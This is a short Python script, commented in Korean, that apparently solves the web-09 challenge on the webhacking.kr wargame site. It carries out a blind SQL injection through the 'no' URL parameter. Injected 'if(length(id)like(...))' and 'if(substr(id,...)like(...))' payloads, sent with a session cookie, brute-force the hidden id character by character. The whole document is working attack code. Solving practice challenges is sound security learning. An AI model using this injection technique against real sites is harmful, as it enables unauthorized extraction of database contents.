import requests

cookies = {'PHPSESSID': 'l23e993lh0t787nb17so6l592d'} #세션 쿠키를 입력
length = 0
BF_result = ""

#id length 구하기
for i in range(1,100):
    url = 'https://webhacking.kr/challenge/web-09/index.php?no=if(length(id)like({}),3,0)'.format(i)
    response = requests.get(url=url,cookies=cookies)
    print(i)
    if 'Secret' in response.text:
        length = i
        break
#id 값 구하기
for i in range(1,length+1): #넉넉하게 범위 잡음
    for j in range(97,127):
        url = 'https://webhacking.kr/challenge/web-09/index.php?no=if(substr(id,{},1)like({}),3,0)'.format(i,hex(j)) #url 주소를 입력
        response = requests.get(url=url, cookies=cookies)
        #print(BF_result + chr(j))
        print("{} {}".format(i,j))
        if 'Secret' in response.text:
            BF_result += chr(j)
            print("password is {}".format(BF_result))
            break
print("id is : " + BF_result)
